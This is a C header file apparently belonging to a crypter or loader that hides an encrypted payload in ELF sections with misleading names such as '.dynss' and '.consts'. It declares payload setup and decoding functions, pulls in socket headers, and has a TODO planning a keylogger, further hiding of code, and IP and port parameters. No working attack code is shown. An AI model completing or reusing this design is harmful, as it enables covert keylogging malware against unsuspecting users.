
#ifndef ELF_UTILS_H
#define ELF_UTILS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <elf.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define ELF_KEY (".dynss")
#define ELF_CODE (".comments")
#define ELF_BOOL (".consts")
#define SECTION(x) __attribute__((section(x)))
#define ELF_FUNC_SIZE (486) // use size -d -A [binary]

#include "setup.h"

static SECTION(ELF_BOOL) bool is_first_time = true;
static SECTION(ELF_KEY) char key[ELF_FUNC_SIZE] = {0};

#define ELF_NAMELEN (1024)

typedef struct bin_s {
    char name[ELF_NAMELEN];
    unsigned int len;
    unsigned char *content;
} elf_bin_t;

typedef struct utl_s {
    int s_offset;
    int s_len;
    elf_bin_t bin;
} elf_utils_t;

// elf.c
elf_utils_t *elf_read(char const *);
void elf_decode(elf_utils_t *);

// payload.c
void setup_payload(void);

/*
    TODO: Implement logger, keylogger in another thread or something like this
    - hide the most amount in the crypted section
    - pass port and ip as parameters
*/

#endif // ELF_UTILS_H
